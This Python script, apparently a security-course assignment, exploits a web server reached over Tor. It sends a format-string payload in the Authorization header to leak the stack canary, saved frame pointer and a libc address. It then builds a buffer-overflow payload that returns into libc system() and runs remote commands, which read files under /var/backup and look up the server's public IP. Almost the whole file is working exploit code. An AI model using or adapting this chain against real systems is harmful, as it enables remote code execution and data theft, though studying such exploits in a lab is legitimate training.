import requests
import sys
import binascii
import subprocess

# Converts hex_string to binary data
# Creates a file with this data 
# File data will be send in the request for the buffer overflow attack 
def convert_hex_to_binary(hex_string):

	binstr = binascii.unhexlify(hex_string)
	with open("myfile.bin","wb") as f: f.write(binstr)

	with open('myfile.bin', 'rb') as f:
	    hex_string = f.read()

	binary_data = hex_string

	return binary_data

def little_to_big_endian(input_str):
	ret_string = bytearray.fromhex(input_str)
	ret_string.reverse()
	ret_string = ''.join(format(x, '02x') for x in ret_string)

	return ret_string.upper()

# Sends curl request in order to execute system call with command as parameter
# max_time parameter is the maximum time of response in curl command 
def execute_command(data, command, max_time):
	# write the argument of system call
	temp_string = command.encode("utf-8").hex().replace('0x','').upper()
	curl = data + temp_string

	# Create file with data that will be used for the buffer overflow attack
	convert_hex_to_binary(curl)

	curl = "curl --socks5-hostname localhost:9050 --max-time " + str(max_time) + " --data-binary '@myfile.bin' "
	curl += "--verbose --http0.9 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Content-Length: 0' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ=='"
	status, output = subprocess.getstatusoutput(curl)
	print("\n\n---------------------------------------------------- Response for command '" + command + "' ----------------------------------------------------\n\n") 
	print(output)

# session for tor request
# linux default tor proxy port is 9050
session = requests.session()
session.proxies = {'http':  'socks5h://localhost:9050',
                   'https': 'socks5h://localhost:9050'}

# parameters for executing curl command
url = "http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html"

headers = {	"Accept-Encoding": "deflate, gzip", "Content-Type": "application/json",
			"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8", 
			"Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive", "Content-Length": "150", 
			"Upgrade-Insecure-Requests": "1","Authorization": "Basic JTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eCAlMDh4ICUwOHggJTA4eA==" }

data = b'A' * 1

# first request to get stack data
res = session.post(url, headers=headers, data=data)

# get stack data and do some cleaning
stack_data = res.headers['WWW-Authenticate']
stack_data = stack_data.replace('Basic realm="Invalid user: ','').replace('"','')
stack_data = stack_data.split(' ')

canary = stack_data[26]
word_after_canary = stack_data[28]
saved_ebp = stack_data[29]
ret_address = stack_data[30]

# Code in main.c replaces "=" with "\0" 
# "3D" is the hex code for "=" 
canary = canary.replace('00','3D')

data = 'A'*104

# write address of buffer
temp_string = int(saved_ebp, 16)
temp_string = temp_string - 232
temp_string = hex(temp_string).replace('0x','').upper()
data += little_to_big_endian(temp_string)

data += 'A'*8
data += little_to_big_endian(canary) # write canary
data += little_to_big_endian(word_after_canary) # write word after canary
data += 'A'*8
data += little_to_big_endian(saved_ebp) # write saved ebp

# write address of system-libc call
temp_string = int(stack_data[27], 16)
temp_string = temp_string - 1686176 #1729776
temp_string = hex(temp_string).replace('0x','').upper()
data += little_to_big_endian(temp_string)

# write address of argument of system call
temp_string = int(saved_ebp, 16)
temp_string = temp_string - 232
temp_string = hex(temp_string) # address of buffer
temp_string = int(temp_string, 16)
temp_string = temp_string + 88
temp_string = hex(temp_string).replace('0x','').upper() # address of argument
data += little_to_big_endian(temp_string)

# write address of argument of system call
temp_string = int(saved_ebp, 16)
temp_string = temp_string - 232
temp_string = hex(temp_string) # address of buffer
temp_string = int(temp_string, 16)
temp_string = temp_string + 88
temp_string = hex(temp_string).replace('0x','').upper() # address of argument
data += little_to_big_endian(temp_string)

max_time = sys.argv[1]

print("\n\n---------------------------------------------------------------------- Question 4, 5 ----------------------------------------------------------------------\n\n")


execute_command(data, "cat /var/backup/backup.log", max_time)
print("\n\n")
execute_command(data, "ls -all /var/backup/", max_time)
print("\n\n")
execute_command(data, "cat /var/backup/index.html", max_time)
print("\n\n")
execute_command(data, "cat /var/backup/z.log", max_time)
print("\n\n")
execute_command(data, "curl ifconfig.me", max_time) # getting public ip